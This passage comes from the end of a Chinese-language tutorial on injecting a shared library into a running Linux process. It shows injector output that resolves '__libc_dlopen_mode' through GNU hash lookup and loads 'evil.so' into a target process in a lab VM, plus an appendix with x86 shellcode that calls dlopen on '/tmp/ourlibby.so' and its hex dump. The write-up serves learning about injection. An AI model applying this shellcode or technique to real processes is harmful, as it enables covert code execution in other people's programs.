[+] dynstr: 0xb7535474
[+] dynysm: 0xb752bed4
[+] soname: libc.so.6
[*] start gnu hash search:
        new_hash: 0x8049891(4073429154)
        n: 197
        hash buckets index: 0x3c6(966), first dynsym index: 0x8f5(2293)
[*] start bucket search:
        h2: 0xd5e07632(3588257330)
        h2: 0xf2cb98a2(4073429154)
----------------------------------------------------------------
[+] Found '__libc_dlopen_mode' at 0xb764bae0
[+] entry point: 0x8048350
[+] stopped 24506 at eip:0xb76e1428, esp:0xbfec2fec
[+] inject code done 24506 at eip:0x8048366
[*] start search 'evilfunc':
----------------------------------------------------------------
[+] libaray path: /vagrant/inject/evil.so
[+] gnu.hash:
        nbuckets: 0x3
        symndx: 0x7
        nmaskwords: 0x2
        shift2: 0x6
        bitmask_addr: 0xb76db148
        hash_buckets_addr: 0xb76db150
        hash_values_addr: 0xb76db15c
[+] dynstr: 0xb76db244
[+] dynysm: 0xb76db174
[*] start gnu hash search:
        new_hash: 0x80498ec(701380385)
        n: 1
        hash buckets index: 0x2(2), first dynsym index: 0xb(11)
[*] start bucket search:
        h2: 0x29ce3720(701380384)
----------------------------------------------------------------
[+] Found 'evilfunc' at 0xb76db53b
[*] lib injection done!

#查看pid对应maps可以查看到已经加载了恶意的so
➜  inject cat /proc/24506/maps
08048000-08049000 r-xp 00000000 08:01 266876     /home/vagrant/pwn/elf/hello
08049000-0804a000 r--p 00000000 08:01 266876     /home/vagrant/pwn/elf/hello
0804a000-0804b000 rw-p 00001000 08:01 266876     /home/vagrant/pwn/elf/hello
084a2000-084c3000 rw-p 00000000 00:00 0          [heap]
b7527000-b7528000 rw-p 00000000 00:00 0
b7528000-b76d0000 r-xp 00000000 08:01 2134       /lib/i386-linux-gnu/libc-2.19.so
b76d0000-b76d1000 ---p 001a8000 08:01 2134       /lib/i386-linux-gnu/libc-2.19.so
b76d1000-b76d3000 r--p 001a8000 08:01 2134       /lib/i386-linux-gnu/libc-2.19.so
b76d3000-b76d4000 rw-p 001aa000 08:01 2134       /lib/i386-linux-gnu/libc-2.19.so
b76d4000-b76d7000 rw-p 00000000 00:00 0
b76db000-b76dc000 r-xp 00000000 00:1a 1974       /vagrant/inject/evil.so
b76dc000-b76dd000 r--p 00000000 00:1a 1974       /vagrant/inject/evil.so
b76dd000-b76de000 rw-p 00001000 00:1a 1974       /vagrant/inject/evil.so
b76de000-b76e1000 rw-p 00000000 00:00 0
b76e1000-b76e2000 r-xp 00000000 00:00 0          [vdso]
b76e2000-b7702000 r-xp 00000000 08:01 2153       /lib/i386-linux-gnu/ld-2.19.so
b7702000-b7703000 r--p 0001f000 08:01 2153       /lib/i386-linux-gnu/ld-2.19.so
b7703000-b7704000 rw-p 00020000 08:01 2153       /lib/i386-linux-gnu/ld-2.19.so
bfea3000-bfec4000 rw-p 00000000 00:00 0          [stack]
➜  inject
```

## 附录

#### 如何生成汇编对应16进制?
这里使用 `nasm` 工具.

先写好汇编代码

```
➜ cat __libc_dlopen_mode.asm
_start: jmp string
begin: pop eax ; char *file
mov edx, 0x1 ; int mode
push edx ;
push eax ;
mov ebx, 0x12345678 ; addr of __libc_dlopen_mode()
call ebx ; call __libc_dlopen_mode()
add esp, 0x8 ; resotre stack
int3 ; breakpoint

string: call begin
db "/tmp/ourlibby.so",0x00
```

之后使用 `nasm -f elf32 -o __libc_dlopen_mode.o __libc_dlopen_mode.asm` 即可生成目标文件, 之后使用 `objdump -d __libc_dlopen_mode.o` 即可查看汇编对应的16进制

```
➜ objdump -d __libc_dlopen_mode.o

__libc_dlopen_mode.o:     file format elf32-i386


Disassembly of section .text:

00000000 <_start>:
   0:   eb 13                   jmp    15 <string>

00000002 <begin>:
   2:   58                      pop    %eax
   3:   ba 01 00 00 00          mov    $0x1,%edx
   8:   52                      push   %edx
   9:   50                      push   %eax
   a:   bb 78 56 34 12          mov    $0x12345678,%ebx
   f:   ff d3                   call   *%ebx
  11:   83 c4 08                add    $0x8,%esp
  14:   cc                      int3

00000015 <string>:
  15:   e8 e8 ff ff ff          call   2 <begin>
  1a:   2f                      das
  1b:   74 6d                   je     8a <string+0x75>
  1d:   70 2f                   jo     4e <string+0x39>
  1f:   6f                      outsl  %ds:(%esi),(%dx)
  20:   75 72                   jne    94 <string+0x7f>
  22:   6c                      insb   (%dx),%es:(%edi)
  23:   69 62 62 79 2e 73 6f    imul   $0x6f732e79,0x62(%edx),%esp
```

[1]: https://zh.wikipedia.org/wiki/%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8